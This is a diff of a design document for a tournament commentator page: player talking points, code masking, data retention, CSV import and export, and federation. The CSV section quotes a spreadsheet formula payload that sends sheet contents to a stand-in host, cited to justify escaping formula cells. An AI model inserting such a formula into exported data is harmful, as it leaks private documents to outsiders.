@@ -1,6 +1,8 @@
 # Commentator — a second-screen information surface
 
-**Status:** plan, nothing built. `PLAN.md` owns the scoreboard; `STUDIO.md` owns the stage and what goes on air. This document covers a third consumer: the person **talking** over the broadcast, who needs information rather than graphics.
+**Status:** the page is built. `PLAN.md` owns the scoreboard; `STUDIO.md` owns the stage and what goes on air. This document covers a third consumer: the person **talking** over the broadcast, who needs information rather than graphics.
+
+Sections are marked **built** or **not built** individually, because they landed at different times and the gap between them is where this document earns its keep. Prepared talking points and the bio round trip (§5a) are built; the spotter (§6) and the auto-surfacing behaviour (§7) are not.
 
 **Written:** 2026-08-22
 
@@ -156,6 +158,182 @@ The genuine nuance is narrower, and it is a design consequence rather than a leg
 ### Related profile data that exists but is not exposed
 
 `uo_player_profile` already carries `nickname`, `position`, `throwing_hand`, `height`, `nationality`, `story` and `achievements` — genuinely good commentary material, and there is a `public` column controlling which of those are publishable. **None of it appears in any Live! entity payload**, so it is not reachable today, and `entity=players&id=<id>` returns `{"error":"Invalid ID"}` even for an id the list endpoint itself returned. That looks like a bug or an undocumented parameter rather than a design decision; it is unexplored and worth settling before assuming this data is unavailable.
+
+### Commentary material: what a player would say about themselves, if asked
+
+§3's lesson is that commentators do not read tables on air. Everything else in this document produces *numbers* — who scored, how often, what the run of play is — and none of it answers the question a commentator reaches for when the disc is not in the air, which is **who is this person**.
+
+`uo_player_profile` is closer to that than any statistic, and `story` and `achievements` are free text, so in principle a player can already write anything there. **Free text is the wrong shape for this job, and that is the actual gap rather than the absence of a field.** A commentator has a few seconds between points; a paragraph has to be read, held in mind and paraphrased before any of it can be said. A short labelled line can be lifted straight into speech. So the ask is a small number of **short, structured, self-declared** fields beside the ones that exist:
+
+| field | why a commentator wants it |
+|---|---|
+| other sports played, past or present | the most reliable source of a line there is — a background in athletics, handball or basketball explains something visible on the field, and cross-sport athletes are common in ultimate |
+| how they came to ultimate | universally interesting and never guessable: a university team, a sibling, a game on a beach |
+| occupation or field of study | places the person outside the sport, which is what an audience remembers a week later |
+| hobbies and interests | the light material every broadcast needs during a stoppage |
+| years playing, and clubs played for before | the closest thing to a career record this system can have without federation (§8a) |
+
+Each is one line, and each is optional.
+
+**Same home, same edit surface, same consent mechanism as pronunciation and pronouns:** `uo_player_profile`, self-edited through `user/playerprofile.php`, published only if the player adds the field to the `public` whitelist. That is what makes this a cheap ask rather than a large one — the storage, the player-owned edit page, the per-field opt-in and the privacy obligations all exist, and these fields join them rather than creating anything new.
+
+**But unlike pronunciation, this cannot start as an overlay-local store.** A broadcast team can research a phonetic spelling and type it in; nobody can supply a player's hobbies on their behalf. The proving-ground pattern (`STUDIO.md` §2.5) that makes `conf/pronunciations.json` the right first home does not apply, because this data has exactly one possible author. It is upstream from the start or it does not exist.
+
+Three things to get right, each of them a rule already stated elsewhere in these documents:
+
+- **Absent is the normal case, not an exception.** On any real roster most of these fields will be empty and many always will be. Show what exists and nothing where it does not — no placeholder, no prompt implying the player was asked and declined. Same rule as `STUDIO.md` §3.3, for the same reason: an empty field is not a fact about the player.
+- **Never inferred, never filled in by somebody else.** Player-authored or nothing, exactly as for pronouns above. The stakes are lower than they are for pronouns, but the failure is the same one: a guess said on air is heard as the player's own words.
+- **This is the first data on the page with no verification path at all.** A statistic can be incomplete and can be labelled as such (§2); a biography can simply be out of date — a job left two years ago, a club no longer played for — and nothing in the system will ever notice. So carry when the profile was last edited, and present these as the player's words rather than as facts the tournament is asserting. A commentator who knows the provenance says "he told us" instead of "he is".
+
+**And none of it is reachable today, including the fields that already exist** — the subsection above applies unchanged. Exposing `uo_player_profile` through a Live! payload at all is a prerequisite for any of this, and it is the cheaper half of the work.
+
+## 5a. Prepared talking points, typed by the commentator — **built**
+
+Everything in the subsection above is an upstream ask, which means it is worth nothing this season. This is the part that could be built without waiting for anybody, and it is the lowest-hanging thing on the page.
+
+**The case is specific rather than general.** At a large tournament the commentary position is staffed all week and material can be prepared properly. At a smaller one there are commentators for the finals and nobody before that, and the way material actually reaches them is that somebody asks the two teams for something to say and is handed it an hour before the pull — by email, in a message, or verbally. There is no UltiOrganizer surface for that, and there will not be one before the game starts. So the commentator types it in here.
+
+That does not make §5's ask redundant. A self-declared profile field is still the right destination: it is authored by the person it describes, it follows them between tournaments, and it carries consent. This is what a desk does in the absence of one, and it should be read as scaffolding rather than as the answer.
+
+### Where it lives
+
+A free-text box per player, in the **player detail overlay** — the same dialog the roster already opens — with the roster marking which players have one.
+
+Both halves of that matter. The overlay is where a note has room to be read and edited, and where it is already in the context of that player's numbers. But a note in a dialog is invisible from the outside, and a commentator is not going to open twenty-eight players one at a time to discover which three have anything written about them. So the list carries a marker: **presence only, never a preview**. The roster's job is to be scanned by jersey number (§5) and a column of text excerpts would destroy that.
+
+The marker is a dot, and three things about it were settled by measurement rather than taste:
+
+- **It is drawn in `--link`, not `--accent`.** Accent is a *fill* colour — the background of a pressed button, with white text on it — so against the panel behind the dot it measured **2.59:1** in the night theme. That is below even the 3:1 floor for a meaningful graphic, for the only visual signal that a player has a note. `--link` is the token that is legible against the page in both themes: 8.4:1 in day, 10.4:1 in night.
+- **Colour and shape carry none of it.** The dot is `aria-hidden`; the button also says "has talking points" in visually-hidden text and in its `title`. Same rule as the hold/break blocks on the scoreboard (`PLAN.md` §4) — colour reinforces, words mean.
+- **Markers update in place, never by re-rendering the roster.** A 28-player squad scrolls inside its panel, and the moment a marker changes is exactly the moment somebody has finished writing a note and is looking at the row they wrote it for. Rebuilding the table to add one dot would throw them back to the top of the list.
+
+### The room is the code alone, and that is the whole design
+
+`Lines` keys a room by **game plus code**. This store keys by **code alone**, and the difference is the point rather than an inconsistency.
+
+A line selection is worthless five minutes after the point ends. A note about a player is worth exactly as much in the final as it was in the quarter. Keying notes by game would make a desk retype everything each round, which is the surest way to have them stop doing it by lunchtime. So the room is the code, and a desk that keeps its code keeps its notes for the tournament.
+
+**Codes are still generated per game, and carrying notes between games is a deliberate act rather than an automatic one.** A revision of this feature made a game with no stored code inherit the last code the browser used, so that notes would follow a desk from round to round. That was withdrawn, and the reason is worth keeping because it is not about notes at all.
+
+**The sync code is not only a namespace — it is also the possession-write credential.** The Studio operator nominates a code per game, and the desk holding it may declare possession, which feeds break chance, clean holds and the turnover count on the scoreboard bug (§6, `STUDIO.md` §10.4). Possession reaches air. So making the code sticky across fixtures would have taken a convenience for a private reference panel and quietly widened what can change a broadcast: a desk nominated on one game would arrive at the next already holding the code. Two very different consequences ride one value, and the gate has to match the larger of them.
+
+The general lesson, which applies to anything else added to this page: **before making a value more persistent, check everything that value authorises.** The reasoning for the change was entirely about notes and entirely correct about notes, and it was still wrong.
+
+So a desk that wants its notes in the next round types the code it used before. That is the same gesture as sharing the code with a partner, it cannot happen by accident, and the roster shows immediately whether the notes came with it — no dots means the wrong room.
+
+It also removes the trap `Lines::prune()` fell into. There, rooms have to be bounded per game *and* overall, because bounding per game alone bounds nothing — any positive integer is an acceptable game id, so a caller walking `game=1, 2, 3 …` collects a fresh allowance every time (§6). With no game in the key there is one flat directory and one bound that actually holds.
+
+### Saving
+
+**On a pause in typing, and again on blur and on close — never on a button.** There is no good failure mode for a Save button here: a commentator who has typed a paragraph and closes the dialog has lost it, and will not find out until the moment they wanted it. The box says `Unsaved` / `Saving…` / `Saved` so the state is never a guess, and a failed write says *"Not shared — kept on this screen"* rather than pretending, because the local text is still there and still usable.
+
+An empty box **deletes** rather than storing a blank. A blank entry would still count against the room's cap and still hold its own expiry clock.
+
+### This is the one store holding one person's words about another
+
+Every other store here holds facts about a game. This holds what a commentator wrote about a named player, and that difference is load-bearing rather than decorative:
+
+- **It has no verification path at all.** A statistic can be incomplete and labelled so (§2). A note can simply be wrong, or out of date, and nothing in the system will ever notice. So every note carries **who wrote it and when** — a commentator about to repeat something on air should be able to tell their partner's note from their own, and a note from last week from one written this morning.
+- **It is third-party authored, which is the opposite of the rule §5 sets for pronouns and pronunciation.** That rule is not violated so much as out of scope: this is a commentator's own preparation notebook, not a claim about what the player says of themselves. It is worth being explicit that the two must not be conflated if these ever end up displayed together.
+- **It is personal data, so the boundaries are real.** `conf/` is default-closed in the overlays' `.htaccess`, so a note room is not a servable file — asserted by a test, not assumed. The directory is gitignored. And notes expire; see below.
+- **The code is still a namespace, not a credential.** Everything §6 says about that applies here, with one difference worth stating plainly: a guessed line room exposes who somebody thinks is on the field, and a guessed note room exposes what a commentary desk wrote about named players. That is a larger consequence from the same mechanism. It stays unauthenticated for the reason §6 gives — a tournament often has no admin at the field, and gating this behind broadcast control would be a much worse trade — but it is the reason the store expires, the reason the files are not servable, and the reason the code is no longer on permanent display.
+
+### The code is masked, on both surfaces
+
+**A namespace nobody can guess is exactly what these guarantees rest on — and a code printed on screen all day is not unguessable, it is published.** Both the commentary booth and the operator's station are among the most-walked-past screens at a tournament, and five characters are memorable at a glance. Saying "it is a namespace, not a credential" describes what the code *is not*; it does not excuse handing it to anyone who walks past.
+
+So `shared/secret.js` masks both fields by default, with a Show button that reveals and **re-masks itself after thirty seconds**. The auto-hide is the part that does the work: "reveal, read it out, forget to hide it again" is the real failure mode, and a manual toggle alone would spend a tournament in the revealed state.
+
+Three details, the last of which corrects an earlier draft of this section:
+
+- **On the Studio the stakes are higher, not lower.** That code authorises writing possession, which reaches air — so it is masked there too, and the change confirmation no longer echoes it back: the operator just typed it, so repeating it tells them nothing and only puts it on screen twice.
+- **Masking is testable without a password**, because the field renders for an anonymous visitor too — disabled, and with nothing behind the mask, since the nominated code is never published. The test therefore lives outside the logged-in block: a test that only runs when `ADMIN_PASS` happens to be set is a test that mostly does not run.
+- **Generating a new code does *not* reveal the field**, and the argument that said it should was circular. It ran: an operator who has to press Show after generating will leave it revealed — but the auto-hide means the field *cannot* be left revealed, which is the whole point of having one. Once the auto-hide exists, "reveal it for them" is only ever a convenience, never a safeguard, and here it was not even that: the confirmation message already carries the code for six seconds and then clears itself. Revealing the field as well was a second copy of the same secret, on screen for five times as long. **The general form is worth keeping: once a control makes a bad state unreachable, any argument of the shape "otherwise users will end up in that state" is no longer available.**
+
+### Retention: notes are gathered for one broadcast and then deleted
+
+**A note lasts seven days from its last edit, and the sweep runs on read as well as on write.**
+
+Both halves were needed. The first implementation expired rooms after fourteen days but pruned only when something was written — which meant a tournament that finished and was never written to again kept its notes forever, exactly the case a retention limit exists for. Now any read of any room clears everything past the limit, so the next desk to open the page is what cleans up after the last one. There is no cron, nothing to install, and nothing that depends on a tournament remembering to tidy up.
+
+The details that matter:
+
+- **Reading does not extend a note's life.** Expiry is measured from the last write. A desk leaving the page open must not keep somebody's personal data alive indefinitely, and an expiry any passer-by can renew is not an expiry.
+- **Seven days, from the last edit.** Long enough to cover preparation in the days before an event plus the event itself; short enough that a tournament's notes are gone the following week.
+- **The sweep is throttled to once an hour on read, and is unconditional on write.** That looks inconsistent and is not. On read, pruning enforces *retention*, and once an hour is ample for a seven-day window against a page that polls every fifteen seconds. On write it also enforces the room-count *bound*, and a bound that only applies once an hour is not a bound — an unauthenticated caller would create rooms inside the gap.
+- **If the throttle stamp cannot be written, it degrades to pruning on every read** rather than to never pruning. The expensive failure is cheap; the cheap failure would be keeping personal data past its limit.
+- **The box says so.** A note that has not been written yet shows *"Shared with anyone holding the room code. Deleted 7 days after the last edit."* An expiry nobody was told about is indistinguishable from losing data.
+
+### The bio round trip: export, the team fills it in, import — **built**
+
+Typing notes at the desk is the fallback, not the goal. The material already exists before the commentator ever sees it: somebody asked the two teams for something to say, and a team sent back a document. Retyping that into twenty-eight boxes is work nobody does twice.
+
+```
+export CSV (identifier + name, empty prompt columns)
+  -> the team puts it in a shared sheet
+  -> each player fills in their own row
+  -> export CSV
+  -> import here
+```
+
+**A shared document the players fill in themselves is a better shape than a commentator's notebook in every way that matters**, and it is the principle §5 argues for the upstream profile fields, reached without waiting for a schema change:
+
+- **The player writes their own entry**, so it is self-declared rather than second-hand — which answers the sharpest objection to this whole feature, that it is one person's unverifiable words about another.
+- **It gives players agency at the point where agency means something.** A player can add, edit or remove their own line while the document is still open, before the game. A note typed at the desk gives them no such moment.
+- **It is reusable.** The same document serves every tournament the team attends, and it is the team's to keep.
+- **The team owns the boundary.** Whatever is in that document, the team chose to send it.
+
+It does not replace the box. A commentator's own observations — something a coach mentioned, something from the previous game — have no other home, so **import fills empty notes only and never overwrites one that was typed**, and the preview says how many were kept for that reason. That rule is enforced in the store rather than only in the page, so a partner writing during a preview cannot be overwritten by an import that never saw their note.
+
+#### The identifier is never trusted
+
+The CSV spends its life in a document an entire team can edit. Anyone with the link can change an identifier, or add a row carrying somebody else's. Used blindly, that is a way to write arbitrary text against a named player **on the opposing team** — text a commentator then reads out on air, in good faith, believing it came from that player.
+
+So the identifier is only ever a lookup key inside one team's roster, never an instruction about who to write to:
+
+1. **An import is scoped to one team**, chosen by the commentator. The candidate set is that team's roster and nothing else, so no row can reach a player on the other team however its identifier was edited.
+2. **The exported name travels with the identifier and is checked on the way back.** If they disagree the row is rejected and both names are shown. That catches the within-team version of the same trick, where somebody retargets a teammate's row.
+3. **Nothing is applied until the reader has seen the tally.** *"2 to import · 2 not imported"*, with every refusal listed by row number and reason.
+
+Name comparison is strict about letters and loose about accents, case, punctuation and spacing. Rejecting `Álex Auer` against `Alex Auer` would block honest rows, and a check people learn to work around protects nothing.
+
+Every rejection is reported rather than dropped. A silent import is how the wrong biography ends up on the desk in front of somebody about to say it.
+
+#### Why a CSV, and why the browser parses it
+
+**Take a file; do not fetch a URL.** The obvious design is a link to the team's document that the server retrieves:
+
+| | server fetches a URL | CSV, exported by the team |
+|---|---|---|
+| Works on a tournament LAN with no internet | **no** — and that is the normal case in these documents | yes |
+| Private document | needs OAuth, an API key, or a document made public to the world | already authenticated: whoever exported it could open it |
+| New outbound dependency from PHP | yes, with the timeouts, retries and SSRF surface that implies | none |
+| Google-specific | yes, in practice | no — Sheets, Excel, Numbers and every registration system export CSV |
+
+A CSV is also the format the source is *already* in: a team collecting player answers is collecting them in a spreadsheet, one row per player, with the jersey number already a column.
+
+**`FileReader` reads it locally and the page posts the result through the endpoint that already exists.** No upload handling, no temp files, no new server surface, and it works with the network down.
+
+**The export marks formula-looking cells as text.** This is CSV injection, and it applies here because the export carries **player names out of the database** into a file the team opens in Sheets or Excel. A player named `=HYPERLINK("http://x/?"&A1,"hi")` is a formula that runs when the team opens the sheet, and in Sheets that is enough to exfiltrate the rest of the document. Quoting does *not* prevent it — both applications evaluate a formula inside a quoted field — so any cell beginning `=`, `+`, `-`, `@`, tab or CR is prefixed with an apostrophe, the spreadsheet's own "this is text" marker. Ordinary names and numbers are untouched, and a neutralised name still matches its roster entry on the way back, because the name comparison ignores punctuation.
+
+**`shared/csv.js` is a real parser, not `split(',')`**, and it is tested directly rather than through the page. Quoted fields containing commas and newlines are normal in exactly this content — *"Handball, then ultimate at university"* is one field — and splitting on commas truncates the note and shifts every later column, silently, on a file that looks fine in a spreadsheet. It also sniffs the delimiter outside quotes (a European Excel writes semicolons, and the commas inside a quoted answer outnumber them), strips the UTF-8 BOM Excel writes, and accepts all three line endings.
+
+#### What the export contains
+
+`Player ID`, `Number`, `Name`, then five empty prompt columns — the fields §5 asks upstream for, phrased as questions. A blank column gets a blank answer; a column that asks something gets an answer. A team may delete or add columns freely: the import maps by header, several filled columns compose into one labelled note, and a single filled column is not labelled with its own question.
+
+An untouched export imports nothing rather than blanking the roster.
+
+#### One request, not twenty-eight
+
+The import writes through a batch call rather than a loop of single saves. Twenty-eight separate requests means twenty-eight lock/read/write cycles, each a chance for a partner's edit to interleave, and a failure halfway through leaves an import half-applied with no way to say which half. One request, one lock, one file write — the only shape in which "apply this import" is a single decision.
+
+**This is also where a real bug surfaced.** `save()` used to refuse any write landing within 0.2s of the last and report success, on the reasoning that the next poll carries the same state. It does not: the state was never stored, so the next poll *reverts* the edit and the caller was told it saved. `filemtime()` has one-second granularity, so the real window was unpredictable up to a second rather than the 0.2s it appeared to be. It now skips a write that would **change nothing** instead of one that arrives too soon — which drops exactly the writes worth dropping (a debounced save firing twice with the same text) and never loses one that would have changed anything.
+### Caps
+
+The second unauthenticated write in the project, so the same discipline as `lines.php`: **bound what the attacker controls, not what a caller is expected to send.** 1000 characters per note, 100 players per room (which fixes the document's ceiling at ~100 KB), 200 rooms in the directory, the expiry above, and a minimum interval between writes. The players-per-room cap is the one that matters and the one the equivalent in `lines.php` originally got wrong: `save()` merges one player into whatever the room already holds, so a per-note length cap on its own would let a room grow one request at a time forever.
+
+Read-modify-write goes through `flock` on a shared lock file, as `colors.php` and `possession.php` do. The temp-file-and-rename underneath gives *readers* atomicity and excludes no writer at all — each one holds `LOCK_EX` on its own private temp file.
 
 ## 6. Who is on the field
 
@@ -349,6 +527,48 @@ A commentator's page can be several seconds behind and remain useful — they ar
 
 One caveat worth designing for: **the page will lag the commentator's own eyes.** They will see a goal several seconds before the panel does. So the surfaced card must be labelled with *which* goal it refers to — scorer and score — rather than implying "just now". A card that appears silently after the next point has started, with no indication of what it describes, is confusing in a way a timestamp fixes for free.
 
+## 8a. Federation: what a second instance would add, and what makes it hard
+
+**The idea:** UltiOrganizer and Live! instances are islands. Every tournament runs its own database, so a player's record, a club's results and a head-to-head history all end at the edge of whichever installation happened to host the event. If instances could read one another, this page could answer questions it currently cannot answer at all.
+
+**What it unlocks is exactly the category §3 lists and §4 cannot deliver: pre-match notes.** Head-to-head history against tonight's opponent. A player's career rather than their tournament. Which of these players have been team-mates before, and where. The last time these two clubs met and what happened. Those are the lines that separate commentary from score-reading, and every one of them needs data from an event this instance never hosted.
+
+**The abstraction already exists one level down, which is the encouraging part.** UltiOrganizer separates the per-event row from the persistent entity in both directions:
+
+| per event | persistent | link |
+|---|---|---|
+| `uo_player` — one row per player **per team**, carrying `num` and that roster's goal counts | `uo_player_profile` — the person | `uo_player.profile_id` |
+| `uo_team` — one club's entry into one series | `uo_club` | `uo_team.club` |
+
+So "the same person across teams and seasons" is already a first-class concept inside one installation. `uo_player_stats` is keyed by `player_id` but carries `profile_id`, `season` and `series` alongside it — a career table in all but name. Federation is that same abstraction one level up: what `profile_id` does across seasons, a global identifier would do across instances.
+
+**And there is precedent for anchoring a profile to a foreign system.** `uo_player_profile.ffindr_id` and `uo_team_profile.ffindr_id` are exactly that — another service's id stored against a local record, on both the person and the club. Worth being accurate about their state: nothing in `lib/`, `admin/` or `user/` writes either column. They appear only in `lib/privacy.functions.php`, which clears them on anonymisation, and `lib/data.functions.php`, which classifies them as private. The *shape* has a precedent; a working integration does not.
+
+### The hard part is identity, not transport
+
+Moving JSON between two instances is the easy half and not worth designing here. The problem is deciding that a player in one database and a player in another are the same person.
+
+**A wrong merge is worse than no data.** It attributes one player's career to another, on air, under their name — and it is simultaneously a privacy failure, because it links records about two different people. Names collide, common names collide often, and people change club, country and sometimes name over a career. Anything that looks like a clean heuristic here is not one.
+
+- **The identifier has to be issued, not derived.** Matching on name plus birthdate fails in exactly the cases it most needs to get right, and it turns every federation request into a query containing personal data. An opaque issued id does neither.
+- **There is a real-world anchor rather than a registry to invent.** WFDF already issues player numbers for sanctioned events, and `uo_player_profile` already has somewhere to put one — it carries `national_id` and `accreditation_id` beside `ffindr_id`. Riding an identifier players already have, administered by a body that already administers it, sidesteps the hardest problem in the whole idea: who decides that two records are one person.
+- **Clubs are the easier half and worth doing first.** They are far fewer than players, they are public entities rather than private individuals, `uo_club` already exists per instance, and a wrong club merge is embarrassing where a wrong player merge is harmful. Club head-to-head is also among the most valuable outputs. It is the part of this that could be tried without answering the identity question in its hardest form.
+
+### Consent does not federate, and neither does erasure
+
+`uo_player_profile.public` is a per-field opt-in **within one installation**. A player who agreed to publish their nickname at one tournament has not agreed to publish it at every tournament, to every other instance, indefinitely. Reading a local opt-in as a global one is the shortest path from a good idea to a privacy incident.
+
+Erasure runs the same way in reverse. Today, deleting or anonymising a player is a local operation with a documented scope (`docs/privacy.md`). Once records have been copied between instances, deleting from one leaves the copies, and a deletion request has to reach every holder or it has not been honoured. **That is the strongest argument for federating by reference rather than by copy:** pull on demand from the instance that owns the record, cache briefly, and never treat a cached copy as a record of your own.
+
+### Two constraints this project already knows
+
+- **Instances are frequently offline.** A tournament LAN is often not on the internet at all — the same fact that shapes most of the decisions in these documents. Federated data is therefore strictly enrichment: fetched ahead of time, cached, and absent without consequence. Nothing on this page, and certainly nothing on air, may wait on another organisation's server.
+- **Never assert on air what the data cannot support** (`PLAN.md` §6) bites harder here than anywhere else, because federated data arrives without the provenance a local record has. A career total assembled from three instances, one of which does not record assists, is not a career total. If it is shown at all, it is shown with its sources named — the same rule §2 applies to an incomplete block count, one scale up.
+
+### Scope
+
+**None of this can happen in this repository.** `PLAN.md` §6 forbids schema changes here, and federation is a UltiOrganizer-wide change to identity, privacy and the API long before it is anything a commentator sees. It is recorded in these documents because the commentator page is where its absence is felt most sharply, not because it is a task on this project's list. `PLAN.md` §5 carries it as an upstream ask.
+
 ## 9. MVP
 
 Deliberately small, and none of it blocked on anything unresolved.
@@ -374,11 +594,13 @@ Deliberately small, and none of it blocked on anything unresolved.
 5. **Auto-surface on goal**, obeying §7, with pin and mute.
 6. **Line selection** (§6), shared per team — the only piece needing a writable store, and the only one two people use at once.
 
-Explicitly not in the MVP: search, drill-down, milestones, streak detection, bracket rendering, pre-match notes. Each is additive to a page that already works.
+Explicitly not in the MVP: search, drill-down, milestones, streak detection, bracket rendering, pre-match notes. Each is additive to a page that already works — and the most valuable pre-match notes are additive to something that does not yet exist, since head-to-head and career history need data from other instances (§8a).
 
 **Ordering note:** items 2–4 are a single static page over one payload and are worth building first, because they are useful even if the auto-surfacing (5) is later judged too distracting to keep. Within them, the rosters come before the feed: a commentator can work from rosters alone, but not from a feed alone.
 
 **The pronunciation and pronoun store is a separate, smaller piece**, and can ship before or after the page — an editor over a `conf/` JSON file, with the page showing a hint when one exists and nothing when it does not. Neither field blocks the other, and neither blocks the MVP; both are useful from the first entry.
+
+7. **Prepared talking points** (§5a) — **built.** A free-text note per player in the detail overlay, shared by the room code, with the roster marking who has one. It is listed after the MVP because it was not in the original plan, and ahead of everything deferred because it needed no upstream change and no data the page did not already have.
 
 ## 10. Open questions
 
